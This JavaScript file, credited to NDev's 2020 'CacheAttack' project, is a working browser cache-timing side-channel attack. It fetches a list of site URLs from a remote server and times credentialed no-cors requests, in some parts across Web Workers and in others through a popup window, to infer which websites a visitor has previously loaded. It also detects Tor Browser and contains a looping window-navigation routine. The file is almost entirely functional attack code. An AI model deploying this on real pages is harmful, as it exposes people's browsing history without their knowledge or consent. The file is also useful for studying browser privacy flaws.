/*jshint esversion: 8 */

// NDev 2020 https://github.com/NDevTK/CacheAttack
const firefox = navigator.userAgent.includes("Firefox");
const redirect = "https://cache.ndev.tk/window.html";
const mobile = (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
const max = (mobile) ? 9 : 10.5;

function isTorBrowser() {
  return (window.screen.availHeight === window.innerHeight) && (window.screen.availWidth === window.innerWidth);
}

if (self.document === undefined) {
    onmessage = async e => {
        await ifCachedWorker(e.data, result => postMessage(result));
        postMessage("done");
    };
}

async function getWebsites(cb = false, websites = null, worker = true, CacheTest = false) {
    if (CacheTest) {
        let TestResult = await ifCached_test();
        if (!TestResult) {
            console.error("CacheAttack failed");
            return [];
        }
    }
    var output = [];
    var cb = (cb) ? cb : item => output.push(item);
    if (websites === null) {
        websites = await getRules();
    }
    if(worker) {
        let checks = chunk(websites, Math.ceil(websites.length / navigator.hardwareConcurrency));
        await PromiseForeach(checks, async chunk => {
            let worker = new Worker("https://cache.ndev.tk/embed.js");
            worker.postMessage(chunk);
            await new Promise(resolve => {
                worker.onmessage = e => {
                    if (e.data === "done") {
                        resolve();
                        return
                    }
                    cb(e.data);
                };
            });
            worker.terminate();
        }, 600);
    } else {
        await ifCachedWorker(websites, cb);
    }
    return [...new Set(output)];
}

async function PromiseForeach(item, callback, delay = 0) {
    var jobs = [];
    for (let x of item) {
        await new Promise(resolve => setTimeout(resolve, delay));
        jobs.push(callback(x));
    }
    await Promise.all(jobs);
}

function chunk(array, size) {
    const chunked_arr = [];
    for (let i = 0; i < array.length; i++) {
        const last = chunked_arr[chunked_arr.length - 1];
        if (!last || last.length === size) {
            chunked_arr.push([array[i]]);
        } else {
            last.push(array[i]);
        }
    }
    return chunked_arr;
}

async function getRules() {
    let req = await fetch("https://cache.ndev.tk/rules");
    var body = await req.json();
    return body;
}

function is304(res) {
    if (res.encodedBodySize > 0 &&
        res.transferSize > 0 &&
        res.transferSize < res.encodedBodySize) {
        return true;
    }
    return null;
}

function PerformanceCheck(url) {
    var res = performance.getEntriesByName(url).pop();
    if (res === undefined) return null;
    if (is304(res)) return true;
    return (res.transferSize !== 0);
}

async function ifCachedWorker(websites, cb) {
    // Foreach website check if cached
    for (let website of websites) {
        let result = await ifCached(website[0]);
        if (result) {
            cb(website);
        }
    }
}

async function ifCached_test() {
    let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
    let result = await ifCached(cache_test);
    await fetch("https://ndev.tk/README.md");
    let result2 = await ifCached("https://ndev.tk/README.md");
    return (!result && result2);
}

// Will include credentials so please use a sandbox domain or my postMessage API
async function ifCached(url) {
    var state = true;
    var controller = new AbortController();
    var signal = controller.signal;
    var timeout = await setTimeout(_ => { // Stop request after max
        controller.abort();
        state = false;
    }, max);
    try {
        await fetch(url, {mode: "no-cors",credentials: "include",signal});
    } catch (err) {
        // Website blocked by client
        clearTimeout(timeout);
    }
    clearTimeout(timeout);
    return state;
}

function WindowEvent(check = false) {
    return new Promise(resolve => {
        window.addEventListener('message', e => {
            if (check !== false && e.data !== check) return;
            resolve(e.data);
        });
    });
}

function initChecker() {
    checker = open(redirect);
    window_timeout = (firefox) ? 10 : 30;
    if(isTorBrowser()) window_timeout = 150;
}

async function ifCached_window(url) {
    checker.location = url;
    let timeout = false;
    setTimeout(_ => {
       timeout = true;
       checker.location = redirect;
    }, window_timeout);
    event = await WindowEvent();
    let state = (!timeout);
    await WindowEvent("load");
    if (firefox) await new Promise(resolve => setTimeout(resolve, 50));
    return state;
}

async function block(url) {
    for (;;) {
        if (checker.closed) location.reload();
        await ifCached_window(url[0]);
    }
}

function blockerFrame(url) {
    if (document.getElementById("ifrm")) {
        ifrm.src = redirect;
        return;
    }
    var ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", url);
    ifrm.id = "ifrm";
    ifrm.hidden = true;
    document.body.appendChild(ifrm);
}
